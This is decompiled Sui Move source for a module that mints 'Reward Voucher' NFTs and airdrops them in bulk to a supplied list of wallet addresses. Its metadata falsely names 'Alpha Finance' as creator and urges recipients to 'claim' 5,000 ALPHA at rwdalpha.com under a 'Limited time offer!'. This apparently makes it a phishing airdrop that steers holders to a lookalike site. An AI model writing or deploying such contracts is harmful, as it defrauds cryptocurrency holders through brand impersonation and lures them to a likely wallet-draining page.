module 0x81a62c861cb0473c12b020b8e1e08b31df0d23d53be20417e583769fbc4613cf::reward4974 {
    struct REWARD4974 has drop {
        dummy_field: bool,
    }

    struct TICKET_4974 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward4974(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_4974{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729866614/rwdalphacom_1025_0_yztfht.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 ALPHA"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_4974>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Voucher"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729866614/rwdalphacom_1025_0_yztfht.jpg"),
                description : 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 ALPHA"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_4974>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD4974, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Voucher"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dtvasq8xx/image/upload/v1729866614/rwdalphacom_1025_0_yztfht.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your 5,000 ALPHA Reward from Alpha Finance! Visit https://rwdalpha.com to verify and get your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdalpha.com"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Alpha Finance"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"5,000 ALPHA"));
        let v4 = 0x2::package::claim<REWARD4974>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_4974>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_4974>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_4974>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

